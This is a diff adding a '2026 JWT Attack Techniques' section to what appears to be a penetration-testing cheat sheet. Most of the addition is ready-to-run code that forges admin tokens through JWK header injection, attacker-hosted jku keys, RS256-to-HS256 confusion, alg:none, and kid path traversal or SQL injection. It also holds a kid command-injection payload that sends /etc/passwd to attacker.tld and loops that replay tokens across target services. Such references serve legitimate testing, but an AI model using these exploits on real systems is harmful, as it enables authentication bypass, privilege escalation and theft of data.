@@ -566,3 +566,233 @@ including `role: "admin"`.
 - https://hashcat.net/wiki/doku.php?id=example_hashes (mode 16500)
 - https://github.com/wallarm/jwt-secrets
 - https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+
+---
+
+## 2026 JWT Attack Techniques
+
+### 1. JWK Header Injection
+Embed your own public key directly in the token header. If the server trusts the embedded JWK without verifying it against a whitelist, it will validate your forged token.
+```bash
+# Generate keypair and forge token with embedded JWK
+python3 - <<'PY'
+import jwt
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import json, base64
+
+priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub = priv.public_key()
+nums = pub.public_numbers()
+
+def b64u(i):
+    b = i.to_bytes((i.bit_length()+7)//8, "big")
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+jwk = {"kty":"RSA","n":b64u(nums.n),"e":b64u(nums.e),"use":"sig"}
+priv_pem = priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
+tok = jwt.encode({"sub":"admin","role":"admin"}, priv_pem, algorithm="RS256", headers={"jwk": jwk})
+print(tok)
+PY
+```
+
+### 2. jku/x5u Header Manipulation
+Point `jku` or `x5u` to an attacker-controlled key server. The server fetches YOUR keys and validates YOUR signature.
+```bash
+# Host your JWKS at attacker.tld, then:
+python3 - <<'PY'
+import jwt
+priv = open("/tmp/priv.pem","rb").read()
+tok = jwt.encode({"sub":"admin","role":"admin"}, priv, algorithm="RS256",
+                 headers={"jku":"https://attacker.tld/.well-known/jwks.json","kid":"pwn"})
+print(tok)
+PY
+
+# Bypass host validation with URL tricks:
+# jku: https://legit.com@attacker.tld/jwks.json
+# jku: https://legit.com%23@attacker.tld/jwks.json
+# x5u: https://attacker.tld/cert.pem (same concept, X.509 cert chain)
+```
+
+### 3. JWT Algorithm Confusion: RS256 to HS256
+Use the server's RSA public key as the HMAC secret. If the library blindly trusts the `alg` header, it verifies HS256 with the public key bytes.
+```bash
+# Fetch public key, then sign with it as HMAC secret
+curl -sk https://target/.well-known/jwks.json -o /tmp/jwks.json
+# Convert JWK to PEM (see Section 6 above), then:
+python3 - <<'PY'
+import jwt
+pub = open("/tmp/key.pem","rb").read()
+# Some libraries need the raw bytes without PEM headers
+tok = jwt.encode({"sub":"admin","role":"admin"}, pub, algorithm="HS256")
+print(tok)
+PY
+
+# jwt_tool shortcut:
+jwt_tool "$JWT" -X k -pk /tmp/key.pem
+```
+
+### 4. Kid Parameter Injection
+`kid` is often used in file lookups or DB queries — ripe for injection.
+```bash
+# Path traversal to /dev/null (empty key)
+python3 -c "
+import jwt
+tok = jwt.encode({'sub':'admin','role':'admin'}, '', algorithm='HS256',
+                 headers={'kid':'../../../../../../../dev/null'})
+print(tok)
+"
+
+# SQL injection in kid (when kid is used in a SQL query)
+# kid: ' UNION SELECT 'attacker-controlled-secret' -- -
+# Then sign with 'attacker-controlled-secret'
+
+# kid pointing to a known static file:
+# kid: ../../../../../../etc/hostname
+# Sign with the content of /etc/hostname as the HMAC key
+
+# kid with command injection:
+# kid: |/usr/bin/id
+# kid: $(curl attacker.tld/exfil?key=$(cat /etc/passwd))
+```
+
+### 5. JWT Replay Across Services
+When multiple microservices share the same signing key, a token from Service A can be replayed against Service B.
+```bash
+# Get token from service A (lower privilege)
+TOKEN_A=$(curl -sk -X POST https://service-a.target.com/login \
+  -d '{"user":"test","pass":"test"}' | jq -r .token)
+
+# Replay against service B (higher privilege or different data)
+curl -sk -H "Authorization: Bearer $TOKEN_A" https://service-b.target.com/api/admin/users
+curl -sk -H "Authorization: Bearer $TOKEN_A" https://internal-api.target.com/api/secrets
+
+# Check if the same JWT works across different subdomains
+for svc in api admin portal internal dashboard; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer $TOKEN_A" "https://$svc.target.com/api/me")
+  echo "$svc.target.com → $code"
+done
+```
+
+### 6. Cross-Service JWT Confusion
+A token issued for one audience/service is accepted by another that doesn't validate the `aud` or `iss` claims.
+```bash
+# Decode and check if aud/iss are present
+echo "$JWT" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq .
+
+# Forge token with different aud/iss
+python3 - <<'PY'
+import jwt
+# If you cracked the secret or exploited key confusion:
+SECRET = "cracked-or-confused-key"
+tok = jwt.encode({
+    "sub": "admin",
+    "role": "admin",
+    "aud": "admin-panel",    # change audience
+    "iss": "auth-service",   # spoof issuer
+    "exp": 9999999999
+}, SECRET, algorithm="HS256")
+print(tok)
+PY
+
+# Test: does the admin panel accept a token issued for the user portal?
+```
+
+### 7. JWT Claim Tampering After Weak Signature Verification
+Some implementations verify the signature but don't validate individual claims (exp, nbf, iss, aud, role).
+```bash
+# Re-sign with known/cracked secret but tamper claims
+python3 - <<'PY'
+import jwt, time
+SECRET = "known-secret"
+tok = jwt.encode({
+    "sub": "admin",
+    "role": "superadmin",
+    "permissions": ["*"],
+    "exp": int(time.time()) + 86400*365,  # 1 year expiry
+    "email_verified": True,
+    "is_admin": True
+}, SECRET, algorithm="HS256")
+print(tok)
+PY
+
+# Test expired tokens — does the server actually check exp?
+# Decode, set exp to past date, re-sign, send
+```
+
+### 8. Nested JWT Attacks (JWT Inside JWT)
+Some systems use JWE wrapping JWS, or pass JWTs as claims inside other JWTs.
+```bash
+# Decode outer JWT
+echo "$JWT" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq .
+# If a claim contains another JWT (e.g., "inner_token": "eyJ..."), decode that too
+
+# Attack: tamper the inner JWT while keeping outer JWT valid
+# Or: strip the outer JWE layer and send the inner JWS directly
+# jwt_tool handles nested structures:
+jwt_tool "$JWT" -T  # interactive tamper mode
+```
+
+### 9. PASETO vs JWT Comparison and Testing
+PASETO (Platform-Agnostic SEcurity TOkens) is designed to fix JWT's footguns. When a target uses PASETO, the attack surface is different.
+```bash
+# Detect PASETO (tokens start with v1/v2/v3/v4.local/public)
+echo "$TOKEN" | grep -E '^v[1-4]\.(local|public)\.'
+
+# PASETO has NO algorithm negotiation — no alg:none, no key confusion
+# Focus attacks on:
+# - Key management (leaked keys, weak key derivation)
+# - Claim validation (does the server check exp, aud, iss?)
+# - Token replay (no built-in replay protection)
+# - Footer manipulation (PASETO footers are unencrypted metadata)
+
+# pip install paseto for Python testing:
+pip3 install paseto pysodium
+python3 -c "
+import paseto
+# Attempt to forge with known/leaked key
+"
+```
+
+### 10. Automated Testing with jwt_tool, python-jose, PyJWT
+```bash
+# Full automated scan with jwt_tool (runs ALL attacks)
+jwt_tool -t "https://target/api/me" -rh "Authorization: Bearer $JWT" -M at
+
+# Batch test multiple endpoints
+for ep in /api/me /api/admin /api/users /api/config; do
+  echo "=== $ep ==="
+  jwt_tool -t "https://target$ep" -rh "Authorization: Bearer $JWT" -M at 2>&1 | grep -E "FOUND|EXPLOIT|VULN"
+done
+
+# python-jose supports all JWK/JWE/JWS operations for scripting
+pip3 install python-jose[cryptography]
+python3 - <<'PY'
+from jose import jwt, jwk
+from jose.constants import ALGORITHMS
+
+# Test all algorithms against the token
+token = "YOUR_JWT_HERE"
+header = jwt.get_unverified_header(token)
+claims = jwt.get_unverified_claims(token)
+print(f"Algorithm: {header.get('alg')}")
+print(f"Claims: {claims}")
+print(f"Has kid: {'kid' in header}")
+print(f"Has jku: {'jku' in header}")
+print(f"Has jwk: {'jwk' in header}")
+print(f"Has x5u: {'x5u' in header}")
+print(f"Has x5c: {'x5c' in header}")
+PY
+
+# PyJWT for quick forging
+pip3 install PyJWT cryptography
+python3 -c "
+import jwt
+# Quick none attack
+import base64, json
+h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
+print(f'{h}.{p}.')
+"
+```
